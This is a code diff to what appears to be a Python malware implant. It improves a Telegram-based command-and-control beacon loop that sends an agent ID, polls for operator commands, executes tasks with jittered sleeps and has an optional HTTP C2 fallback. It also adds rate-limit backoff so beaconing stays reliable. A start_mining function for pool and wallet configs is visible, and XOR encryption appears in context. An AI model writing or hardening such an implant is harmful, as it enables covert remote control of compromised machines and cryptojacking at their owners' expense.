@@ -118,19 +118,25 @@ def xor_crypt(data: bytes, key: bytes) -> bytes:
 # Global state
 _telegram_offset = 0
 _last_telegram_send = 0
-_last_beacon_msg_id = 0
+_rate_limit_until = 0
 
 def telegram_send(message: str, reply_to: int = None) -> dict:
-    """Send message via Telegram Bot API with rate limiting."""
-    global _last_telegram_send
+    """Send message via Telegram Bot API with rate limiting and backoff."""
+    global _last_telegram_send, _rate_limit_until
     
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         return {"ok": False, "error": "No credentials"}
     
-    # Rate limiting - min 1 second between sends
+    # Check if we're in rate limit cooldown
+    if time.time() < _rate_limit_until:
+        wait = _rate_limit_until - time.time()
+        log(f"Rate limited, waiting {wait:.0f}s", "DEBUG")
+        time.sleep(wait)
+    
+    # Rate limiting - min 2 seconds between sends
     elapsed = time.time() - _last_telegram_send
-    if elapsed < 1.0:
-        time.sleep(1.0 - elapsed)
+    if elapsed < 2.0:
+        time.sleep(2.0 - elapsed)
     
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -146,16 +152,32 @@ def telegram_send(message: str, reply_to: int = None) -> dict:
             "Content-Type": "application/json",
             "User-Agent": "Mozilla/5.0"
         })
-        resp = urlopen(req, timeout=10)
+        resp = urlopen(req, timeout=15)
         result = json.loads(resp.read().decode())
         
         _last_telegram_send = time.time()
         
         if result.get("ok"):
             return {"ok": True, "result": result.get("result"), "message_id": result.get("result", {}).get("message_id")}
+        
+        # Check for rate limit in error
+        error_code = result.get("error_code", 0)
+        if error_code == 429:
+            retry_after = result.get("parameters", {}).get("retry_after", 30)
+            _rate_limit_until = time.time() + retry_after
+            log(f"Rate limited, retry after {retry_after}s", "WARN")
+            return {"ok": False, "error": "rate_limit", "retry_after": retry_after}
+        
         return {"ok": False, "error": result.get("description")}
     except Exception as e:
         _last_telegram_send = time.time()
+        
+        # Handle 429 from HTTP error
+        if "429" in str(e):
+            _rate_limit_until = time.time() + 30
+            log("Rate limited (429), cooling down 30s", "WARN")
+            return {"ok": False, "error": "rate_limit", "retry_after": 30}
+        
         log(f"Telegram error: {e}", "ERROR")
         return {"ok": False, "error": str(e)}
 
@@ -276,6 +298,7 @@ def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
     _total_beacons = 0
     _total_tasks = 0
     _last_msg_id = 0
+    _consecutive_failures = 0
     
     # Optional HTTP fallback
     c2_url = os.environ.get("C2_URL", "")
@@ -300,9 +323,24 @@ Time: {time.strftime('%H:%M:%S')}"""
             result = telegram_send(beacon_msg)
             if result.get("ok"):
                 _last_msg_id = result.get("message_id", 0)
+                _consecutive_failures = 0
                 log(f"Beacon #{_total_beacons} sent (msg_id={_last_msg_id})", "CONN")
+            elif result.get("error") == "rate_limit":
+                # Rate limited - wait and retry
+                wait = result.get("retry_after", 30)
+                log(f"Rate limited, waiting {wait}s before retry", "WARN")
+                time.sleep(wait)
+                continue
             else:
-                log(f"Beacon failed: {result.get('error')}", "ERROR")
+                _consecutive_failures += 1
+                log(f"Beacon failed ({_consecutive_failures}): {result.get('error')}", "ERROR")
+                
+                # Exponential backoff on failures
+                if _consecutive_failures > 3:
+                    backoff = min(60, 5 * (2 ** (_consecutive_failures - 3)))
+                    log(f"Backing off {backoff}s", "WARN")
+                    time.sleep(backoff)
+                    continue
             
             # Try to read replies (may fail with 409)
             commands = telegram_read_replies(agent_id, _last_msg_id)
@@ -349,16 +387,16 @@ Time: {time.strftime('%H:%M:%S')}"""
                 except Exception as e:
                     telegram_send(f"❌ Task #{task_id}\nError: {e}")
             
-            # Sleep with jitter
+            # Sleep with jitter (minimum 5s to avoid rate limits)
             jitter_s = sleep * jitter / 100
-            actual_sleep = max(1, sleep + random.uniform(-jitter_s, jitter_s))
+            actual_sleep = max(5, sleep + random.uniform(-jitter_s, jitter_s))
             time.sleep(actual_sleep)
             
         except KeyboardInterrupt:
             break
         except Exception as e:
             log(f"Bridge error: {e}", "ERROR")
-            time.sleep(5)
+            time.sleep(10)
 
 def start_mining(config: str) -> str:
     """Start mining with given config (pool:wallet format)."""
